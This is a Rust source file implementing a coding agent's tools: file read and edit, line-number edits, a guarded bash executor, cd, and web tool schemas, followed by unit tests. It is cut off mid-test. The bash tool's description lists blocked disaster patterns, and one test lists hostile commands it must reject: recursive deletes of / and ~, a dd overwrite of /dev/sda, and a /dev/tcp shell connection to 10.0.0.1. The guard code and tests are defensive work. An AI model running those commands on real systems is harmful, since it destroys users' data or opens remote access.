//! Built-in tools: edit, mass_edit, bash, cd.
//!
//! Mirrors the shape of pi's packages/coding-agent/src/core/tools/ (one
//! schema per tool, registered into a registry), but lives in a single
//! module while the tool set is small: each tool is a "parse + execute"
//! pair.
//!
//! # Why two text-replacement tools
//!
//! **edit** finds `old` anywhere in the file and replaces it with `new`.
//! It refuses to run unless `old` occurs exactly once — a "replace_all"
//! knob is convenient, but models tend to sweep up places that should not
//! change, and a failed run is hard to localize afterwards.
//!
//! **mass_edit** replaces whole lines by number. It never searches.
//!
//! Its use case is exactly where edit hits the wall: replacing the same
//! word on many lines that look identical makes edit fail with
//! "ambiguous match", while mass_edit just names the lines.
//!
//! # Argument parsing
//!
//! `arguments` arrives as a raw string and is not trusted: fields may be
//! missing, values may be quoted, paths may be `./x` or `../x`. Every
//! tool therefore starts with parse + validate and returns a descriptive
//! error — the error goes back to the model, which self-corrects.

use anyhow::{Context as _, Result, anyhow};

use crate::ai::types::{ToolCall, ToolDef};

// Resolve a model-supplied path to a real file; reject directories and
// nonexistent paths.
//
// Relative paths are resolved against the session `cwd` (`./`, `../` are
// digested naturally by `Path`); absolute paths pass through.
fn resolve_file(cwd: &std::path::Path, raw: &str) -> Result<std::path::PathBuf> {
    let p = std::path::Path::new(raw);
    let p = if p.is_absolute() {
        p.to_path_buf()
    } else {
        cwd.join(p)
    };
    // `..` is digested at the components level; manual canonicalize is
    // unnecessary (and it would require the file to exist)
    let p = p.components().collect::<std::path::PathBuf>();
    if !p.exists() {
        return Err(anyhow!("file not found: {}", p.display()));
    }
    if p.is_dir() {
        return Err(anyhow!(
            "{} is a directory; only files can be edited",
            p.display()
        ));
    }
    Ok(p)
}

// Fetch a string field from the arguments; a missing field is a readable error.
fn need_str(args: &serde_json::Value, key: &str) -> Result<String> {
    args.get(key)
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .ok_or_else(|| anyhow!("missing or non-string argument `{key}`"))
}

// Fetch a positive integer line number (1-based) from the arguments.
fn need_line(args: &serde_json::Value, key: &str) -> Result<usize> {
    let n = args
        .get(key)
        .and_then(|v| v.as_u64())
        .ok_or_else(|| anyhow!("missing or non-numeric argument `{key}`"))?;
    if n == 0 {
        return Err(anyhow!("line numbers start at 1, got 0"));
    }
    Ok(n as usize)
}

// ---------------------------------------------------------------------------
// edit
// ---------------------------------------------------------------------------

// edit arguments.
#[derive(Debug)]
pub struct EditArgs {
    pub path: String,
    pub old: String,
    pub new: String,
}

// ---------------------------------------------------------------------------
// Parse read arguments.
fn parse_read_args(raw: &str) -> Result<String> {
    let v: serde_json::Value = serde_json::from_str(raw)?;
    Ok(v.get("path")
        .and_then(|c| c.as_str())
        .ok_or_else(|| anyhow!("missing `path` argument"))?
        .to_string())
}

// read: show a file's contents (with line numbers, so the model can talk
// about specific lines and feed `mass_edit` later).
//
// Deliberately no output card in the UI: `edit`'s counterpart. The command
// (the path) is the whole story, and reading is side-effect-free — the
// transcript shows the upper card so the user sees what was read.
pub fn read(cwd: &std::path::Path, path: &str) -> Result<String> {
    let p = resolve_file(cwd, path)?;
    let text = std::fs::read_to_string(&p).context("failed to read file")?;
    let mut out = String::new();
    for (i, line) in text.lines().enumerate() {
        out.push_str(&format!("{:>5}\t{line}\n", i + 1));
    }
    if out.is_empty() {
        return Ok("(empty file)".into());
    }
    Ok(out)
}

// Parse bash arguments.
fn parse_bash_args(raw: &str) -> Result<String> {
    let v: serde_json::Value = serde_json::from_str(raw)?;
    Ok(v.get("command")
        .and_then(|c| c.as_str())
        .ok_or_else(|| anyhow!("missing `command` argument"))?
        .to_string())
}

// bash: real shell, guarded by the workspace-license classifier.
// Pipes/redirects/combinators run free; the guard blocks out-of-zone
// deletes and classic disasters (see agent/bash_guard.rs).

// Gatekeeper and executor for the bash tool.
//
// `artifacts` (when attached) powers the #N virtual-file syntax: every
// standalone `#N` token is rewritten to a temp file holding artifact N's
// content, and the command may itself produce a new artifact if its
// output overflows the spill threshold.
fn bash(
    cwd: &std::path::Path,
    command: &str,
    artifacts: Option<&crate::server::artifacts::ArtifactStore>,
) -> Result<String> {
    let cmd = command.trim();
    anyhow::ensure!(!cmd.is_empty(), "empty command");
    anyhow::ensure!(!cmd.contains('\n'), "one command at a time (no newlines)");

    // #N virtual files: rewrite before the guard (rewritten paths are
    // read-only temp files in a private dir; the guard reads them like
    // any other path).
    let (cmd, tmp_dir) = match artifacts {
        Some(a) => {
            let (c, dir) = crate::server::artifacts::resolve_refs(cmd, a)?;
            (c, dir) // dir: Option<PathBuf> — None when no refs resolved
        }
        None => (cmd.to_string(), None),
    };
    debug_assert!(
        tmp_dir
            .as_deref()
            .map(|d| d != std::env::temp_dir())
            .unwrap_or(true),
        "temp dir must be a dedicated subdir, never /tmp itself"
    );
    let zone = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
    let result = match crate::agent::bash_guard::classify(&cmd, &zone) {
        crate::agent::bash_guard::Verdict::Block(hits) => {
            let ids: Vec<&str> = hits.iter().map(|h| h.rule_id).collect();
            anyhow::bail!("denied: {}", ids.join("+"));
        }
        crate::agent::bash_guard::Verdict::Warn(hits) => {
            // High-tier: run, but tag the output so the model sees it.
            let tags: Vec<&str> = hits.iter().map(|h| h.rule_id).collect();
            let out = run_shell(cwd, &cmd)?;
            Ok(format!("[warn: {}]\n{}", tags.join("+"), out))
        }
        crate::agent::bash_guard::Verdict::Allow => run_shell(cwd, &cmd),
    };
    if let Some(dir) = tmp_dir {
        let _ = std::fs::remove_dir_all(dir); // temp materializations die with the command
    }
    let out = result?;
    // Spill: an overflowing output becomes an artifact; the context gets
    // the placeholder (which itself references #id for further use).
    if let Some(a) = artifacts
        && crate::server::artifacts::over_threshold(&out)
    {
        let (id, total) = a.spill("bash", &out)?;
        return Ok(crate::server::artifacts::placeholder(
            id, "bash", total, &out,
        ));
    }
    Ok(out)
}

// bash -c execution with captured output. One command, no newlines —
// checked by the caller.
fn run_shell(cwd: &std::path::Path, cmd: &str) -> Result<String> {
    let out = std::process::Command::new("bash")
        .arg("-c")
        .arg(cmd)
        .current_dir(cwd)
        .output()
        .with_context(|| "spawn bash failed")?;
    // Strip the command's own ANSI escapes before the text goes anywhere.
    //
    // Programs colourise when they think they are on a terminal, and those
    // bytes would otherwise travel two ways: to the model (which does not
    // need escape codes) and into the card (where the terminal re-interprets
    // them, resetting our background mid-row).
    let mut text = crate::tui::text::strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let err = crate::tui::text::strip_ansi(&String::from_utf8_lossy(&out.stderr));
    if !err.trim().is_empty() {
        text.push_str("\n[stderr] ");
        text.push_str(err.trim_end());
    }
    if !out.status.success() {
        text.push_str(&format!("\n[exit {}]", out.status.code().unwrap_or(-1)));
    }
    Ok(text.trim_end().to_string())
}

// Parse cd arguments.
fn parse_cd_args(raw: &str) -> Result<String> {
    let v: serde_json::Value = serde_json::from_str(raw)?;
    Ok(v.get("path")
        .and_then(|c| c.as_str())
        .ok_or_else(|| anyhow!("missing `path` argument"))?
        .to_string())
}

impl BuiltinTools {
    // cd tool: temporary migration. Writes back to the shared slot (when
    // attached) and returns a result description.
    fn tool_cd(&mut self, path: &str) -> Result<String> {
        let p = path.trim();
        anyhow::ensure!(!p.is_empty(), "empty path");
        let target = if let Some(rest) = p.strip_prefix('~') {
            std::path::PathBuf::from(std::env::var_os("HOME").unwrap_or_default()).join(rest)
        } else {
            std::path::PathBuf::from(p)
        };
        let target = if target.is_absolute() {
            target
        } else {
            self.cwd.join(target)
        };
        let real = target
            .canonicalize()
            .with_context(|| format!("no such dir: {p}"))?;
        anyhow::ensure!(real.is_dir(), "not a directory: {p}");
        self.cwd = real.clone();
        // Write back to the shared slot: the TUI statusline and the next
        // turn's spawn_turn snapshot both read it
        if let Some(slot) = &self.cwd_slot {
            *slot.write().expect("cwd 锁中毒") = real.clone();
        }
        Ok(format!("working directory changed to {}", real.display()))
    }
}

// Parse edit arguments. A free function so unit tests can exercise it
// without a model.
pub fn parse_edit_args(arguments: &str) -> Result<EditArgs> {
    let v: serde_json::Value =
        serde_json::from_str(arguments).context("arguments is not valid JSON")?;
    Ok(EditArgs {
        path: need_str(&v, "path")?,
        old: need_str(&v, "old")?,
        new: need_str(&v, "new")?,
    })
}

// Run edit: find `old` in the file — it must occur exactly once — and
// replace it with `new`.
pub fn edit(cwd: &std::path::Path, args: &EditArgs) -> Result<String> {
    let p = resolve_file(cwd, &args.path)?;
    let text = std::fs::read_to_string(&p).context("failed to read file")?;

    let count = text.matches(&args.old).count();
    match count {
        0 => Err(anyhow!(
            "old text not found; it must match the file content exactly (including whitespace and newlines)"
        )),
        1 => {
            let updated = text.replacen(&args.old, &args.new, 1);
            std::fs::write(&p, updated).context("failed to write file")?;
            Ok(format!("replaced: {}", p.display()))
        }
        n => Err(anyhow!(
            "old appears {n} times; edit requires a unique match. \
             Use mass_edit to replace by line number, or make old \
             longer with surrounding context so it is unique"
        )),
    }
}

// ---------------------------------------------------------------------------
// mass_edit
// ---------------------------------------------------------------------------

// One mass_edit instruction: replace line `line` entirely with `text`.
#[derive(Debug, Clone, PartialEq)]
pub struct LineEdit {
    pub line: usize,
    pub text: String,
}

#[derive(Debug)]
pub struct MassEditArgs {
    pub path: String,
    pub edits: Vec<LineEdit>,
}

// Parse mass_edit arguments.
//
// Two shapes are accepted (models emit both; being lenient saves a
// round-trip):
//
// ```json
// {"path":"x.txt","edits":[{"line":1,"text":"new content"}]}
// {"path":"x.txt","lines":[1,2],"text":"same text for all"}
// ```
pub fn parse_mass_edit_args(arguments: &str) -> Result<MassEditArgs> {
    let v: serde_json::Value =
        serde_json::from_str(arguments).context("arguments 不是合法 JSON")?;
    let path = need_str(&v, "path")?;

    if let Some(list) = v.get("edits").and_then(|x| x.as_array()) {
        let mut edits = Vec::with_capacity(list.len());
        for e in list {
            edits.push(LineEdit {
                line: need_line(e, "line")?,
                text: need_str(e, "text")?,
            });
        }
        return Ok(MassEditArgs { path, edits });
    }

    // Shorthand shape: the same text for multiple lines
    if let (Some(lines), Some(text)) = (
        v.get("lines").and_then(|x| x.as_array()),
        v.get("text").and_then(|x| x.as_str()),
    ) {
        let edits = lines
            .iter()
            .map(|l| {
                let line = l
                    .as_u64()
                    .ok_or_else(|| anyhow!("non-numeric entry in `lines`"))?
                    as usize;
                if line == 0 {
                    return Err(anyhow!("行号从 1 开始，收到 0"));
                }
                Ok(LineEdit {
                    line,
                    text: text.to_string(),
                })
            })
            .collect::<Result<Vec<_>>>()?;
        return Ok(MassEditArgs { path, edits });
    }

    Err(anyhow!(
        "mass_edit requires `edits: [{{line, text}}]` or `lines: [..]` + `text`"
    ))
}

// Run mass_edit: replace whole lines by number.
//
// Line numbers are 1-based; edits are applied **largest line first** so
// that editing line 10 does not invalidate line 2 — line numbers are
// stable indexes into the file, and walking from the tail prevents them
// from stepping on each other.
pub fn mass_edit(cwd: &std::path::Path, args: &MassEditArgs) -> Result<String> {
    let p = resolve_file(cwd, &args.path)?;
    let text = std::fs::read_to_string(&p).context("failed to read file")?;

    let total = text.lines().count();
    let mut lines: Vec<String> = text.lines().map(|s| s.to_string()).collect();
    // Without a trailing newline, lines() yields no empty tail and the
    // write-back does not add one; preserved as-is

    let mut edits = args.edits.clone();
    edits.sort_by_key(|e| std::cmp::Reverse(e.line)); // largest first

    // Two edits for the same line = contradictory arguments; refusing is
    // safer than silently honoring the last one
    for w in edits.windows(2) {
        if w[0].line == w[1].line {
            return Err(anyhow!("line {} was specified twice", w[0].line));
        }
    }
    if let Some(e) = edits.last().filter(|e| e.line > total) {
        return Err(anyhow!(
            "line {} does not exist; file has {total} lines",
            e.line
        ));
    }

    let mut changed = 0usize;
    for e in edits {
        lines[e.line - 1] = e.text;
        changed += 1;
    }

    let mut out = lines.join("\n");
    if text.ends_with('\n') {
        out.push('\n');
    }
    std::fs::write(&p, out).context("failed to write file")?;
    Ok(format!("replaced {changed} line(s) in {}", p.display()))
}

// ---------------------------------------------------------------------------
// Registry
// ---------------------------------------------------------------------------

// The real tool executor: dispatches calls the model places.
//
// Holds the session cwd — tool-relative paths resolve against the
// session directory, not whatever directory some thread happens to be in.
pub struct BuiltinTools {
    cwd: std::path::PathBuf,
    // The cd tool writes its new directory here (read by the TUI
    // statusline and the next turn's tools).
    // None = not attached (unit tests); migration then affects only this turn.
    cwd_slot: Option<std::sync::Arc<std::sync::RwLock<std::path::PathBuf>>>,
    // Oversized tool outputs spill here. None = artifact mode off (unit
    // tests, or no DB): results pass through untruncated as before.
    artifacts: Option<crate::server::artifacts::ArtifactStore>,
}

impl BuiltinTools {
    pub fn new(cwd: std::path::PathBuf) -> Self {
        Self {
            cwd,
            cwd_slot: None,
            artifacts: None,
        }
    }

    // Attach the shared cwd slot: cd migrations become visible to the
    // TUI and subsequent turns immediately.
    pub fn with_cwd_slot(
        mut self,
        slot: std::sync::Arc<std::sync::RwLock<std::path::PathBuf>>,
    ) -> Self {
        self.cwd_slot = Some(slot);
        self
    }

    // Attach the artifact spill store (session-scoped, DB-backed).
    pub fn with_artifacts(mut self, store: crate::server::artifacts::ArtifactStore) -> Self {
        self.artifacts = Some(store);
        self
    }

    // Tool manuals, registered into the Context so the model knows the
    // tools exist.
    pub fn definitions() -> Vec<crate::ai::types::ToolDef> {
        use serde_json::json;
        vec![
            ToolDef::function(
                "read",
                "读一个文件的完整内容（带行号）。改文件前先读，避免瞎猜原文。\
                 只读文件，不读目录。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "path": {"type": "string", "description": "文件路径，支持 ./ 与 ../"}
                    },
                    "required": ["intent", "path"]
                }),
            ),
            ToolDef::function(
                "edit",
                "在文件里把一段文本替换成另一段。old 必须在文件里恰好出现一次。\
                 适合改一个有唯一上下文的位置。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "path": {"type": "string", "description": "文件路径，支持 ./ 与 ../"},
                        "old": {"type": "string", "description": "要被替换的原文，必须逐字符匹配且唯一"},
                        "new": {"type": "string", "description": "替换成的内容"}
                    },
                    "required": ["intent", "path", "old", "new"]
                }),
            ),
            ToolDef::function(
                "cd",
                "临时切换工作目录（本会话内有效）。之后的工具调用与相对路径都以新目录为基准。\
                 只接受目录；用 pwd 或 ls 确认切换结果。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "path": {"type": "string", "description": "目标目录，支持 ./ ../ ~/ 与绝对路径"}
                    },
                    "required": ["intent", "path"]
                }),
            ),
            ToolDef::function(
                "bash",
                "执行 shell 命令（bash -c 语义，单条命令，不接受换行）。\
                 管道、重定向、组合可用。工作目录就是许可区，删除/移动其中的东西随便；\
                 但 rm/mv/find -delete 一旦触及工作区之外（包括 ~、/etc 等系统路径）会被直接拒绝。\
                 dd 写盘、fork bomb、反弹 shell、curl|sh 等灾难模式同样被拦截。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "command": {"type": "string", "description": "单条 shell 命令"}
                    },
                    "required": ["intent", "command"]
                }),
            ),
            ToolDef::function(
                "mass_edit",
                "按行号把文件的指定行整行替换。不搜索不匹配，指哪改哪。\
                 适合改动多行、或原文有重复行导致 edit 无法唯一定位的场合。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "path": {"type": "string", "description": "文件路径"},
                        "edits": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "line": {"type": "integer", "description": "行号，从 1 开始"},
                                    "text": {"type": "string", "description": "这一行换成的内容"}
                                },
                                "required": ["line", "text"]
                            }
                        }
                    },
                    "required": ["intent", "path", "edits"]
                }),
            ),
            ToolDef::function(
                "fetch",
                "读取一个网页，返回干净的 Markdown 正文（自动去导航/广告/页脚）。\
                 适合读文档、文章、搜到的结果页。JS 重渲染的页面会自动走浏览器兜底。\
                 输出截断在 24K 字符；raw: true 时返回原始 HTML。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "url": {"type": "string", "description": "要读取的 URL（http/https，裸域名自动补 https://）"},
                        "raw": {"type": "boolean", "description": "返回原始 HTML 而不是 markdown，默认 false"}
                    },
                    "required": ["intent", "url"]
                }),
            ),
            ToolDef::function(
                "browser",
                "操控真实浏览器（Chromium 内核，如 Helium）。四个命令：\
                 open（打开 URL）、act（交互：navigate/click/fill/press/select/scroll/eval/net）、\
                 read（把当前页面读成 markdown）、screenshot（截图存文件）。\
                 适合 JS 重渲染的 SPA、需要登录的站、需要点击/滚动/抓网络请求的场合。\
                 net 操作可列出页面发出的网络请求（找评论区的数据包接口就用它）。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "command": {"type": "string", "enum": ["open", "act", "read", "screenshot"], "description": "操作类型"},
                        "url": {"type": "string", "description": "open/act=navigate: 要打开的 URL"},
                        "op": {"type": "string", "enum": ["navigate", "click", "fill", "press", "select", "scroll", "eval", "net"], "description": "act 的具体操作"},
                        "selector": {"type": "string", "description": "CSS 选择器（click/fill/select/scroll）或按键名（press，如 Enter）"},
                        "value": {"description": "fill: 文本；select: 选项值；scroll: 像素；eval: JS 表达式"},
                        "filter": {"type": "string", "description": "act=net: 只保留 URL 含此子串的请求"},
                        "max": {"type": "integer", "description": "act=net: 最多返回几条请求，默认 20"},
                        "path": {"type": "string", "description": "screenshot: PNG 保存路径；read: markdown 保存路径"},
                        "full_page": {"type": "boolean", "description": "screenshot: 整页截图，默认只截视口"}
                    },
                    "required": ["intent", "command"]
                }),
            ),
            ToolDef::function(
                "search",
                "网页搜索，返回标题、链接与摘要。支持高级语法：\
                 site:github.com（限定域名）、\"精确短语\"、-排除词、filetype:、inurl:、intitle:、before:/after:（YYYY-MM-DD）。\
                 返回 5-10 条结果；查实时信息、文档定位、找源码仓库时用它。",
                json!({
                    "type": "object",
                    "properties": {
                        "intent": {"type": "string", "description": "一句话说明这次调用要干什么，中文，会显示给用户看"},
                        "query": {"type": "string", "description": "搜索词，支持 site: \"短语\" -排除 filetype: inurl: intitle: before:/after:"},
                        "limit": {"type": "integer", "description": "返回条数，默认 8，最大 20"}
                    },
                    "required": ["intent", "query"]
                }),
            ),
        ]
    }
}

impl super::loop_rs::ToolExecutor for BuiltinTools {
    fn execute(&mut self, call: &ToolCall) -> Result<String> {
        match call.name() {
            "edit" => edit(&self.cwd, &parse_edit_args(&call.function.arguments)?),
            "mass_edit" => mass_edit(&self.cwd, &parse_mass_edit_args(&call.function.arguments)?),
            "bash" => bash(
                &self.cwd,
                &parse_bash_args(&call.function.arguments)?,
                self.artifacts.as_ref(),
            ),
            "read" => read(&self.cwd, &parse_read_args(&call.function.arguments)?),
            "cd" => self.tool_cd(&parse_cd_args(&call.function.arguments)?),
            "fetch" => {
                let args = crate::web::parse_fetch_args(&call.function.arguments)?;
                crate::web::fetch(&args)
            }
            "browser" => {
                let args = crate::web::parse_browser_args(&call.function.arguments)?;
                crate::web::browser(&args)
            }
            "search" => {
                let args = crate::web::parse_search_args(&call.function.arguments)?;
                let hits = crate::web::search(&args)?;
                Ok(crate::web::render(&hits))
            }
            other => Err(anyhow!("unknown tool: {other}")),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::super::loop_rs::ToolExecutor as _;
    use super::*;

    fn home_dir() -> std::path::PathBuf {
        std::env::var("HOME")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|_| std::env::temp_dir())
    }

    use serde_json::json;
    use std::path::Path;

    fn tempdir(name: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("mypi-tools-{name}"));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn search_tool_is_registered_with_schema() {
        let defs = BuiltinTools::definitions();
        let s = defs
            .iter()
            .find(|d| d.function.name == "search")
            .expect("search tool must be registered");
        // The model needs the operator list in the description — it is the
        // only docs for the syntax the engine honors.
        assert!(
            s.function.description.contains("site:"),
            "schema must document site: ({})",
            s.function.description
        );
        let props = &s.function.parameters["properties"];
        assert!(props.get("query").is_some());
        assert!(props.get("limit").is_some());
    }

    #[test]
    fn edit_replaces_the_single_occurrence() {
        let d = tempdir("edit-single");
        let f = d.join("a.txt");
        std::fs::write(&f, "红鲤鱼与绿鲤鱼\n").unwrap();

        let args = EditArgs {
            path: "a.txt".into(),
            old: "红鲤鱼".into(),
            new: "绿鲤鱼".into(),
        };
        let out = edit(&d, &args).unwrap();
        assert!(out.contains("replaced"));
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "绿鲤鱼与绿鲤鱼\n");
    }

    #[test]
    fn edit_rejects_ambiguous_match() {
        // The ambiguous-match scenario: two identical occurrences, no way to choose.
        // Refusing is correct behavior — silently replacing the first or last is a guess.
        let d = tempdir("edit-ambiguous");
        let f = d.join("a.txt");
        std::fs::write(&f, "红鲤鱼与红鲤鱼\n").unwrap();

        let args = EditArgs {
            path: "a.txt".into(),
            old: "红鲤鱼".into(),
            new: "绿鲤鱼".into(),
        };
        let err = format!("{:#}", edit(&d, &args).unwrap_err());
        assert!(err.contains("2 times"), "{err}");
        assert!(err.contains("mass_edit"), "要把出路指给模型: {err}");
        assert_eq!(
            std::fs::read_to_string(&f).unwrap(),
            "红鲤鱼与红鲤鱼\n",
            "不能改"
        );
    }

    #[test]
    fn edit_requires_exact_match() {
        let d = tempdir("edit-nomatch");
        std::fs::write(d.join("a.txt"), "红鲤鱼\n").unwrap();
        let args = EditArgs {
            path: "a.txt".into(),
            old: "红鲤渔".into(), // 错别字
            new: "绿鲤鱼".into(),
        };
        let err = format!("{:#}", edit(&d, &args).unwrap_err());
        assert!(err.contains("not found"), "{err}");
    }

    #[test]
    fn edit_accepts_relative_paths_with_dot_dot() {
        let d = tempdir("edit-relpath");
        std::fs::create_dir_all(d.join("sub")).unwrap();
        std::fs::write(d.join("a.txt"), "hello\n").unwrap();

        // From sub/, reference the parent file via ../
        let args = EditArgs {
            path: "../a.txt".into(),
            old: "hello".into(),
            new: "world".into(),
        };
        let cwd = d.join("sub");
        edit(&cwd, &args).unwrap();
        assert_eq!(std::fs::read_to_string(d.join("a.txt")).unwrap(), "world\n");
    }

    #[test]
    fn edit_refuses_missing_file_and_directory() {
        let d = tempdir("edit-guards");
        std::fs::create_dir_all(d.join("sub")).unwrap();

        let args = EditArgs {
            path: "nope.txt".into(),
            old: "a".into(),
            new: "b".into(),
        };
        assert!(edit(&d, &args).is_err());

        let args = EditArgs {
            path: "sub".into(), // 是目录
            old: "a".into(),
            new: "b".into(),
        };
        let err = format!("{:#}", edit(&d, &args).unwrap_err());
        assert!(err.contains("directory"), "{err}");
    }

    #[test]
    fn mass_edit_replaces_whole_lines() {
        let d = tempdir("mass-basic");
        let f = d.join("a.txt");
        std::fs::write(&f, "红鲤鱼\n绿鲤鱼\n红鲤鱼\n").unwrap();

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![
                LineEdit {
                    line: 1,
                    text: "绿鲤鱼".into(),
                },
                LineEdit {
                    line: 3,
                    text: "绿鲤鱼".into(),
                },
            ],
        };
        mass_edit(&d, &args).unwrap();
        // Whole-line replacement: overwrite regardless of the previous content
        assert_eq!(
            std::fs::read_to_string(&f).unwrap(),
            "绿鲤鱼\n绿鲤鱼\n绿鲤鱼\n"
        );
    }

    #[test]
    fn mass_edit_lines_are_stable_when_editing_from_the_bottom() {
        // Key property: applying from the largest line number down keeps earlier line numbers stable
        let d = tempdir("mass-stable");
        let f = d.join("a.txt");
        std::fs::write(&f, "a\nb\nc\nd\ne\n").unwrap();

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![
                LineEdit {
                    line: 5,
                    text: "E".into(),
                },
                LineEdit {
                    line: 2,
                    text: "B".into(),
                },
            ],
        };
        mass_edit(&d, &args).unwrap();
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "a\nB\nc\nd\nE\n");
    }

    #[test]
    fn mass_edit_rejects_duplicate_and_out_of_range_lines() {
        let d = tempdir("mass-guards");
        let f = d.join("a.txt");
        std::fs::write(&f, "a\nb\n").unwrap();

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![
                LineEdit {
                    line: 2,
                    text: "x".into(),
                },
                LineEdit {
                    line: 2,
                    text: "y".into(),
                },
            ],
        };
        let err = format!("{:#}", mass_edit(&d, &args).unwrap_err());
        assert!(err.contains("twice"), "{err}");

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![LineEdit {
                line: 9,
                text: "x".into(),
            }],
        };
        let err = format!("{:#}", mass_edit(&d, &args).unwrap_err());
        assert!(err.contains("9"), "{err}");
    }

    #[test]
    fn mass_edit_parses_both_argument_shapes() {
        let a = parse_mass_edit_args(r#"{"path":"p","edits":[{"line":3,"text":"t"}]}"#).unwrap();
        assert_eq!(
            a.edits,
            vec![LineEdit {
                line: 3,
                text: "t".into()
            }]
        );

        let b = parse_mass_edit_args(r#"{"path":"p","lines":[1,2],"text":"x"}"#).unwrap();
        assert_eq!(
            b.edits,
            vec![
                LineEdit {
                    line: 1,
                    text: "x".into()
                },
                LineEdit {
                    line: 2,
                    text: "x".into()
                },
            ]
        );

        assert!(parse_mass_edit_args(r#"{"path":"p"}"#).is_err());
        assert!(parse_mass_edit_args(r#"{"path":"p","edits":[{"line":0,"text":"t"}]}"#).is_err());
    }

    #[test]
    fn malformed_arguments_report_readable_errors() {
        // Models emit bad JSON routinely; errors must be readable enough for self-correction
        let err = format!("{:#}", parse_edit_args("{不是json").unwrap_err());
        assert!(err.contains("JSON"), "{err}");

        let err = format!("{:#}", parse_edit_args(r#"{"path":"a"}"#).unwrap_err());
        assert!(err.contains("old"), "{err}");
    }

    #[test]
    fn executor_dispatches_by_name_and_reports_unknown() {
        let d = tempdir("exec");
        std::fs::write(d.join("a.txt"), "红鲤鱼\n").unwrap();
        let mut t = BuiltinTools::new(d.clone());

        let call = ToolCall::new(
            "c1",
            "edit",
            json!({
                "path": "a.txt", "old": "红鲤鱼", "new": "绿鲤鱼"
            })
            .to_string(),
        );
        let out = t.execute(&call).unwrap();
        assert!(out.contains("replaced"));

        let bad = ToolCall::new("c2", "不存在的工具", "{}");
        let err = format!("{:#}", t.execute(&bad).unwrap_err());
        assert!(err.contains("unknown tool"), "{err}");
    }

    #[test]
    fn definitions_carry_both_tools() {
        let defs = BuiltinTools::definitions();
        let names: Vec<&str> = defs.iter().map(|d| d.function.name.as_str()).collect();
        assert_eq!(
            names,
            vec![
                "read",
                "edit",
                "cd",
                "bash",
                "mass_edit",
                "fetch",
                "browser",
                "search"
            ]
        );
        // The schema must declare required fields, or the model omits arguments
        for d in &defs {
            assert!(d.function.parameters.get("required").is_some());
        }
    }

    #[test]
    fn line_count_matches_for_trailing_newline() {
        // Line-count edge: with or without a trailing newline, lines() counts the same
        assert_eq!("a\nb\n".lines().count(), 2);
        assert_eq!("a\nb".lines().count(), 2);
    }

    #[test]
    fn cwd_is_respected() {
        let d = tempdir("cwd");
        std::fs::write(d.join("a.txt"), "x\n").unwrap();
        let args = EditArgs {
            path: "a.txt".into(),
            old: "x".into(),
            new: "y".into(),
        };
        edit(Path::new(&d), &args).unwrap();
        assert_eq!(std::fs::read_to_string(d.join("a.txt")).unwrap(), "y\n");
    }

    #[test]
    fn bash_rejects_out_of_zone_and_disasters() {
        let cwd = std::env::temp_dir();
        for bad in [
            "rm -rf /",
            "rm -rf ~",
            "rm ~/notes.txt",
            "rm -rf /etc",
            "rm ../../outside.txt",
            "dd if=/dev/zero of=/dev/sda",
            "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4242'",
            "ls\nrm -rf /",
            "",
        ] {
            assert!(bash(&cwd, bad, None).is_err(), "应拒绝: {bad:?}");
        }
    }

    #[test]
    fn cd_moves_the_license_zone() {
        let d = std::env::temp_dir().join("mypi_zone_a");
        // zone_b must be OUTSIDE both licensed zones (temp + zone_a):
        // the home dir is never licensed, so a scratch dir under it works.
        let other = home_dir().join(".mypi_zone_b");
        let _ = std::fs::create_dir_all(&d);
        let _ = std::fs::create_dir_all(&other);
        let mut t = BuiltinTools::new(d.clone());
        // From zone_a, deleting into zone_b (outside temp) is out of zone.
        let p = other.join("victim.txt");
        std::fs::write(&p, "x").unwrap();
        assert!(bash(&d, &format!("rm {}", p.display()), None).is_err());
        // cd into zone_b: now licensed there.
        t.tool_cd(other.to_str().unwrap()).unwrap();
        let cwd = t.cwd.clone();
        assert!(
            bash(&cwd, &format!("rm {}", p.display()), None).is_ok(),
            "cd 后新许可区应放行"
        );
        let _ = std::fs::remove_dir_all(&d);
        let _ = std::fs::remove_dir_all(&other);
    }

    #[test]
    fn bash_real_shell_inside_zone() {
        let cwd = std::env::temp_dir();
        // Pipes/redirects run free inside the zone.
        let out = bash(&cwd, "echo hello | tr a-z A-Z", None).unwrap();
        assert!(out.contains("HELLO"), "管道可用: {out:?}");
        // grep with no match -> exit 1, reported verbatim
        let out = bash(&cwd, "grep zzzz /dev/null", None).unwrap();
        assert!(out.contains("[exit"), "非零退出要标注: {out:?}");
        // High tier warns but executes.
        let out = bash(&cwd, "echo ok", None).unwrap_or_default();
        assert_eq!(out, "ok");
    }

    #[test]
    fn cd_tool_moves_directory_and_writes_slot() {
        let tmp = std::env::temp_dir();
        let start = tmp.clone();
        let slot = std::sync::Arc::new(std::sync::RwLock::new(start.clone()));
